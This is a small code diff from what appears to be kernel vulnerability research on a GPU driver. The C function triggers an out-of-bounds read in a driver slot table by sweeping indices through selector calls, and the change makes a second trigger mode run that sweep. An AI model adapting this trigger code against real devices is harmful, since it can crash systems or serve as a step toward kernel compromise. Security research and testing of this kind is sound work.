@@ -470,7 +470,7 @@ void nk_iogpu_group_oob_run(int trigger)
 
 
 
-    if (trigger == 5) {
+    if (trigger == 0 || trigger == 5) {
         /* INDEX SWEEP.
          *
          * The slot table's remove (0x9f518ac) reads its element array at
@@ -485,7 +485,7 @@ void nk_iogpu_group_oob_run(int trigger)
          * across the memory after the array. A kill here is the OOB hitting
          * an unmapped page.
          */
-        ol("[grp] === INDEX SWEEP ===");
+        ol("[grp] === INDEX SWEEP (mode=%d) ===", trigger);
         static uint8_t o5[0x200];
         size_t on5 = 0;
         int k5 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, o5, &on5);
